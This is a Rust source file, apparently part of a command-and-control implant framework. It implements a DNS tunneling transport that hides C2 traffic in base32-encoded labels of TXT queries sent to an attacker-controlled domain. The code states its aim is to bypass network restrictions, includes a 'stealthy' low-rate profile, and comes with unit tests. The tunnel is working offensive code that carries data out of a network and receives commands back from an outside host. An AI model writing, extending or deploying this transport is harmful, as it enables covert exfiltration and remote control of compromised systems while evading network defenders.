//! DNS Tunneling Transport for C2 communication
//!
//! Encodes C2 traffic in DNS queries to bypass network restrictions.
//! Uses TXT records for bidirectional communication.
//!
//! Query format:  <base32_data>.<sequence>.<session_id>.<domain> TXT
//! Response: TXT record containing base32 encoded response

use crate::agent::transport::{Transport, TransportConfig, TransportError, TransportResult};
use crate::protocols::dns::{DnsClient, DnsRdata, DnsRecordType};
use std::time::Duration;

/// Maximum data per DNS label (63 bytes minus overhead)
const MAX_LABEL_DATA: usize = 57;

/// Maximum labels per query (253 byte limit for full name)
const MAX_LABELS: usize = 3;

/// DNS transport configuration
#[derive(Debug, Clone)]
pub struct DnsTransportConfig {
    /// Base configuration
    pub base: TransportConfig,
    /// C2 domain (e.g., "c2.example.com")
    pub domain: String,
    /// DNS resolver to use
    pub resolver: String,
    /// Resolver port
    pub resolver_port: u16,
    /// Max retries for each query
    pub max_retries: u32,
    /// Delay between queries (to avoid rate limiting)
    pub query_delay: Duration,
    /// Use random subdomains for each chunk
    pub randomize_subdomains: bool,
}

impl Default for DnsTransportConfig {
    fn default() -> Self {
        Self {
            base: TransportConfig::default(),
            domain: "c2.example.com".into(),
            resolver: "8.8.8.8".into(),
            resolver_port: 53,
            max_retries: 3,
            query_delay: Duration::from_millis(50),
            randomize_subdomains: true,
        }
    }
}

impl DnsTransportConfig {
    /// Create config with C2 domain
    pub fn new(domain: &str) -> Self {
        Self {
            domain: domain.to_string(),
            ..Default::default()
        }
    }

    /// Set DNS resolver
    pub fn with_resolver(mut self, resolver: &str) -> Self {
        self.resolver = resolver.to_string();
        self
    }

    /// Set resolver port
    pub fn with_port(mut self, port: u16) -> Self {
        self.resolver_port = port;
        self
    }

    /// Set query delay
    pub fn with_delay(mut self, delay: Duration) -> Self {
        self.query_delay = delay;
        self
    }
}

/// DNS Transport implementation
pub struct DnsTransport {
    /// Configuration
    config: DnsTransportConfig,
    /// DNS client
    client: DnsClient,
    /// Session identifier for this transport
    session_id: String,
    /// Sequence number for ordering
    sequence: u32,
    /// Connection status
    connected: bool,
}

impl DnsTransport {
    /// Create new DNS transport
    pub fn new(config: DnsTransportConfig) -> Self {
        // DnsClient takes server in constructor
        let server = if config.resolver_port == 53 {
            config.resolver.clone()
        } else {
            format!("{}:{}", config.resolver, config.resolver_port)
        };

        let client =
            DnsClient::new(&server).with_timeout(config.base.io_timeout.as_millis() as u64);

        // Generate random session ID
        let session_id = Self::generate_session_id();

        Self {
            config,
            client,
            session_id,
            sequence: 0,
            connected: true,
        }
    }

    /// Create with simple domain
    pub fn with_domain(domain: &str) -> Self {
        Self::new(DnsTransportConfig::new(domain))
    }

    /// Generate random session ID (8 chars base32)
    fn generate_session_id() -> String {
        let bytes: [u8; 5] = [
            Self::random_byte(),
            Self::random_byte(),
            Self::random_byte(),
            Self::random_byte(),
            Self::random_byte(),
        ];
        Self::base32_encode(&bytes)
    }

    /// Simple random byte generator using time
    fn random_byte() -> u8 {
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .subsec_nanos();
        (nanos % 256) as u8
    }

    /// RFC 4648 Base32 encoding (lowercase for DNS)
    fn base32_encode(data: &[u8]) -> String {
        const ALPHABET: &[u8] = b"abcdefghijklmnopqrstuvwxyz234567";
        let mut result = String::new();

        let mut buffer: u64 = 0;
        let mut bits_in_buffer = 0;

        for &byte in data {
            buffer = (buffer << 8) | (byte as u64);
            bits_in_buffer += 8;

            while bits_in_buffer >= 5 {
                bits_in_buffer -= 5;
                let index = ((buffer >> bits_in_buffer) & 0x1F) as usize;
                result.push(ALPHABET[index] as char);
            }
        }

        // Handle remaining bits
        if bits_in_buffer > 0 {
            let index = ((buffer << (5 - bits_in_buffer)) & 0x1F) as usize;
            result.push(ALPHABET[index] as char);
        }

        result
    }

    /// RFC 4648 Base32 decoding
    fn base32_decode(encoded: &str) -> Result<Vec<u8>, String> {
        let encoded = encoded.to_lowercase();
        let mut result = Vec::new();
        let mut buffer: u64 = 0;
        let mut bits_in_buffer = 0;

        for c in encoded.chars() {
            let value = match c {
                'a'..='z' => (c as u8) - b'a',
                '2'..='7' => (c as u8) - b'2' + 26,
                '=' => continue, // Padding
                _ => return Err(format!("Invalid base32 character: {}", c)),
            };

            buffer = (buffer << 5) | (value as u64);
            bits_in_buffer += 5;

            if bits_in_buffer >= 8 {
                bits_in_buffer -= 8;
                result.push((buffer >> bits_in_buffer) as u8);
            }
        }

        Ok(result)
    }

    /// Split data into DNS-safe chunks
    fn chunk_data(&self, data: &[u8]) -> Vec<String> {
        let encoded = Self::base32_encode(data);
        let mut chunks = Vec::new();

        // Each chunk can have up to MAX_LABELS labels of MAX_LABEL_DATA chars
        let max_chunk = MAX_LABEL_DATA * MAX_LABELS;

        for chunk in encoded.as_bytes().chunks(max_chunk) {
            let chunk_str = std::str::from_utf8(chunk).unwrap_or("");
            chunks.push(chunk_str.to_string());
        }

        chunks
    }

    /// Build DNS query name for a chunk
    fn build_query_name(&self, chunk: &str, chunk_idx: usize, total_chunks: usize) -> String {
        // Format: <data>.<chunk_idx>-<total>.<seq>.<session>.<domain>
        let mut labels = Vec::new();

        // Split chunk into DNS labels
        for label in chunk.as_bytes().chunks(MAX_LABEL_DATA) {
            let label_str = std::str::from_utf8(label).unwrap_or("");
            labels.push(label_str.to_string());
        }

        // Add metadata labels
        labels.push(format!("{}-{}", chunk_idx, total_chunks));
        labels.push(format!("{}", self.sequence));
        labels.push(self.session_id.clone());

        // Add C2 domain
        for part in self.config.domain.split('.') {
            labels.push(part.to_string());
        }

        labels.join(".")
    }

    /// Send a single chunk and get response
    fn send_chunk(
        &self,
        chunk: &str,
        chunk_idx: usize,
        total_chunks: usize,
    ) -> TransportResult<Option<Vec<u8>>> {
        let query_name = self.build_query_name(chunk, chunk_idx, total_chunks);

        for attempt in 0..self.config.max_retries {
            if attempt > 0 {
                std::thread::sleep(Duration::from_millis(100 * (1 << attempt)));
            }

            match self.client.query(&query_name, DnsRecordType::TXT) {
                Ok(answers) => {
                    // Extract TXT record data from DnsAnswer
                    for answer in answers {
                        if let DnsRdata::TXT(chunks) = &answer.data {
                            // Join chunks and decode base32 response
                            let text = chunks.join("");
                            if let Ok(decoded) = Self::base32_decode(&text) {
                                return Ok(Some(decoded));
                            }
                        }
                    }
                    // No TXT record = server acknowledged but no response data
                    return Ok(None);
                }
                Err(e) => {
                    if attempt == self.config.max_retries - 1 {
                        return Err(TransportError::DnsResolutionFailed(e));
                    }
                }
            }
        }

        Err(TransportError::Timeout)
    }

    /// Reassemble response from multiple TXT records
    fn reassemble_response(&self, chunks: Vec<Option<Vec<u8>>>) -> Vec<u8> {
        let mut result = Vec::new();
        for chunk in chunks.into_iter().flatten() {
            result.extend(chunk);
        }
        result
    }
}

impl Transport for DnsTransport {
    fn send(&mut self, data: &[u8]) -> TransportResult<Vec<u8>> {
        self.sequence = self.sequence.wrapping_add(1);

        let chunks = self.chunk_data(data);
        let total_chunks = chunks.len();
        let mut responses = Vec::new();

        for (idx, chunk) in chunks.iter().enumerate() {
            // Add delay between queries to avoid rate limiting
            if idx > 0 {
                std::thread::sleep(self.config.query_delay);
            }

            let response = self.send_chunk(chunk, idx, total_chunks)?;
            responses.push(response);
        }

        // Reassemble response
        let full_response = self.reassemble_response(responses);

        if full_response.is_empty() {
            // Server acknowledged but no data to return
            Ok(Vec::new())
        } else {
            self.connected = true;
            Ok(full_response)
        }
    }

    fn is_connected(&self) -> bool {
        self.connected
    }

    fn reconnect(&mut self) -> TransportResult<()> {
        // Regenerate session ID for new "connection"
        self.session_id = Self::generate_session_id();
        self.sequence = 0;
        self.connected = true;
        Ok(())
    }

    fn name(&self) -> &str {
        "dns"
    }

    fn current_endpoint(&self) -> String {
        format!(
            "dns://{}:{}/{}",
            self.config.resolver, self.config.resolver_port, self.config.domain
        )
    }

    fn close(&mut self) {
        self.connected = false;
    }
}

/// DNS transport profiles for different scenarios
pub struct DnsProfileBuilder;

impl DnsProfileBuilder {
    /// Standard DNS tunneling (port 53)
    pub fn standard(domain: &str) -> DnsTransport {
        DnsTransport::with_domain(domain)
    }

    /// DNS over Google Public DNS
    pub fn google_dns(domain: &str) -> DnsTransport {
        let config = DnsTransportConfig::new(domain).with_resolver("8.8.8.8");
        DnsTransport::new(config)
    }

    /// DNS over Cloudflare
    pub fn cloudflare_dns(domain: &str) -> DnsTransport {
        let config = DnsTransportConfig::new(domain).with_resolver("1.1.1.1");
        DnsTransport::new(config)
    }

    /// Slow and stealthy (longer delays between queries)
    pub fn stealthy(domain: &str) -> DnsTransport {
        let config = DnsTransportConfig::new(domain).with_delay(Duration::from_millis(500));
        DnsTransport::new(config)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_base32_encode_decode() {
        let data = b"Hello, World!";
        let encoded = DnsTransport::base32_encode(data);
        let decoded = DnsTransport::base32_decode(&encoded).unwrap();
        assert_eq!(data.to_vec(), decoded);
    }

    #[test]
    fn test_base32_empty() {
        let data = b"";
        let encoded = DnsTransport::base32_encode(data);
        assert_eq!(encoded, "");
        let decoded = DnsTransport::base32_decode(&encoded).unwrap();
        assert!(decoded.is_empty());
    }

    #[test]
    fn test_base32_vectors() {
        // RFC 4648 test vectors
        assert_eq!(DnsTransport::base32_encode(b"f"), "my");
        assert_eq!(DnsTransport::base32_encode(b"fo"), "mzxq");
        assert_eq!(DnsTransport::base32_encode(b"foo"), "mzxw6");
        assert_eq!(DnsTransport::base32_encode(b"foob"), "mzxw6yq");
        assert_eq!(DnsTransport::base32_encode(b"fooba"), "mzxw6ytb");
        assert_eq!(DnsTransport::base32_encode(b"foobar"), "mzxw6ytboi");
    }

    #[test]
    fn test_chunk_data() {
        let config = DnsTransportConfig::new("test.com");
        let transport = DnsTransport::new(config);

        // Small data = single chunk
        let chunks = transport.chunk_data(b"Hello");
        assert_eq!(chunks.len(), 1);

        // Larger data = multiple chunks
        let large_data = vec![0u8; 500];
        let chunks = transport.chunk_data(&large_data);
        assert!(chunks.len() > 1);
    }

    #[test]
    fn test_query_name_format() {
        let mut config = DnsTransportConfig::new("c2.example.com");
        config.resolver = "127.0.0.1".into();

        let mut transport = DnsTransport::new(config);
        transport.session_id = "abcd1234".into();
        transport.sequence = 42;

        let query_name = transport.build_query_name("mzxw6", 0, 1);

        // Should contain data, chunk info, sequence, session, and domain
        assert!(query_name.contains("mzxw6"));
        assert!(query_name.contains("0-1"));
        assert!(query_name.contains("42"));
        assert!(query_name.contains("abcd1234"));
        assert!(query_name.contains("c2.example.com"));
    }

    #[test]
    fn test_dns_transport_name() {
        let transport = DnsTransport::with_domain("test.com");
        assert_eq!(transport.name(), "dns");
    }

    #[test]
    fn test_dns_profiles() {
        let standard = DnsProfileBuilder::standard("test.com");
        assert_eq!(standard.config.resolver, "8.8.8.8");

        let cf = DnsProfileBuilder::cloudflare_dns("test.com");
        assert_eq!(cf.config.resolver, "1.1.1.1");

        let stealthy = DnsProfileBuilder::stealthy("test.com");
        assert_eq!(stealthy.config.query_delay, Duration::from_millis(500));
    }

    #[test]
    fn test_reconnect_regenerates_session() {
        let mut transport = DnsTransport::with_domain("test.com");
        let original_session = transport.session_id.clone();

        transport.reconnect().unwrap();

        // Session ID should be different (with very high probability)
        // Note: This could theoretically fail if the random generator
        // produces the same value, but that's extremely unlikely
        assert_eq!(transport.sequence, 0);
    }
}
